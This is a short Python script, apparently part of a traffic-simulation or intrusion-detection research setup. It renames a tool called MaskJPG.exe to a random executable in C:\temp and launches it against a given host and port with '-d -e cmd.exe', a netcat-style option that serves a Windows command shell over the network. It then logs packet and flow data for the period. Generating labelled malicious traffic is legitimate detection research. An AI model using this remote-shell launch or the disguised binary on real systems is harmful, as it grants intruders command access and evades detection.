from shutil import copyfile
import uuid
import subprocess
import sys
from dbWriteSimulations import Database
from datetime import datetime
import os

tgt = sys.argv[1]
port = sys.argv[2]


def dbWriteAsncProcess(startTimePeriod,endTimePeriod,day):
    conn = Database()
    conn.updatePackets10Sec(startTimePeriod,endTimePeriod,day)
    conn.updateFlows(startTimePeriod,endTimePeriod,day)
    conn.closeDbSession()

def timePeriodCalc():
    now = datetime.now()
    current_time = int(now.strftime("%H%M%S"))
    return '{}'.format(current_time - current_time % 10)

uuid_string = uuid.uuid4().hex[:8].upper()
filename = 'MaskJPG_{}'.format(uuid_string)
program = 'C:\\temp\\{}.exe'.format(filename)
copyfile('C:\\Scripts\\MaskJPG.exe', program)
argument1 = tgt
argument2 = port
argument3 = '-d'
argument4 = '-e'
argument5 = 'cmd.exe'

day = datetime.today().strftime("%A")
startTimePeriod = timePeriodCalc()
subprocess.call([program, argument1,argument2,argument3,argument4,argument5])
print('New file created: {}.exe and generated evil traffic on port: {} \nFullpath: {}'.format(filename,port,program))
endTimePeriod = str(int(timePeriodCalc()) + 10)
#os.remove(program)

try:
    conn = Database()
    conn.updatePackets10Sec(startTimePeriod, endTimePeriod, day)
    conn.updateFlows(startTimePeriod, endTimePeriod, day)
    conn.closeDbSession()
except Exception as e:
    print(e)